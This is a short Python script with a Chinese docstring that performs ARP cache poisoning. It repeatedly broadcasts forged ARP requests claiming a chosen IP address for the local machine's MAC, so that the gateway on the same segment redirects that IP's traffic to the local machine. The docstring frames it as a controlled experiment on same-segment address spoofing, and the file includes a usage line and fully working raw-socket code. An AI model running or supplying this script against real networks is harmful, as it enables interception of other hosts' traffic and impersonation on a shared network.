#!/usr/bin/env python3
"""不断声称“这个 IP 是我的”：在网卡上反复发 ARP 请求，发送方 IP 填要冒用的地址，发送方 MAC 是本机网卡的。
同一个二层网段里的网关收到之后，会把这个 IP 对应的 MAC 改成本机的，之后发给这个 IP 的包就送到本机来。
只用于“同网段内冒用别人的源地址”的对照实验。

用法：arp-claim.py <网卡> <要冒用的 IP> <网关 IP> <持续秒数>
"""
import socket
import struct
import sys
import time

ifname, ip, gw, secs = sys.argv[1], sys.argv[2], sys.argv[3], float(sys.argv[4])
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
s.bind((ifname, 0))
mac = s.getsockname()[4]
pkt = (b"\xff" * 6 + mac + b"\x08\x06" + struct.pack("!HHBBH", 1, 0x0800, 6, 4, 1)
       + mac + socket.inet_aton(ip) + b"\x00" * 6 + socket.inet_aton(gw))
end = time.time() + secs
while time.time() < end:
    s.send(pkt)
    time.sleep(0.1)
